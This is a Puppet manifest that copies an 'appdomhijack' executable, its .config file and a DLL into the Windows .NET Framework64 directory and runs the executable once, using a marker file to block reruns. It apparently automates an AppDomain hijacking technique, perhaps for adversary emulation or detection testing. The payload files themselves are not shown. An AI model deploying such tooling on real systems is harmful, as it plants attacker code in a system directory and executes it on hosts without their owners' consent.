class windows_appdomain {

  $target_dir = 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319'
  $mutex_file = 'C:\Users\Public\appdomhijack_mutex_file.txt'

  file { $target_dir:
    ensure => directory,
  }

  file { "${target_dir}\\appdomhijack.exe":
    ensure  => file,
    source  => 'puppet:///modules/appdomhijack/appdomhijack.exe',
    require => File[$target_dir],
  }

  file { "${target_dir}\\appdomhijack.exe.config":
    ensure  => file,
    source  => 'puppet:///modules/appdomhijack/appdomhijack.exe.config',
    require => File[$target_dir],
  }

  file { "${target_dir}\\appdomhijack.dll":
    ensure  => file,
    source  => 'puppet:///modules/appdomhijack/appdomhijack.dll',
    require => File[$target_dir],
  }

  # Run AppDomain Hijack executable only if mutex file does NOT exist
  exec { 'run_appdomhijack':
    command  => "\"${target_dir}\\appdomhijack.exe\"",
    creates  => $mutex_file,  # Prevents re-execution if the mutex file exists
    provider => 'windows',
    require  => [ File["${target_dir}\\appdomhijack.exe"],
                  File["${target_dir}\\appdomhijack.exe.config"],
                  File["${target_dir}\\appdomhijack.dll"] ],
  }

  # Create mutex file after execution to prevent reruns
  file { $mutex_file:
    ensure  => file,
    content => 'Mutex file to prevent multiple executions',
    require => Exec['run_appdomhijack'],
  }

}
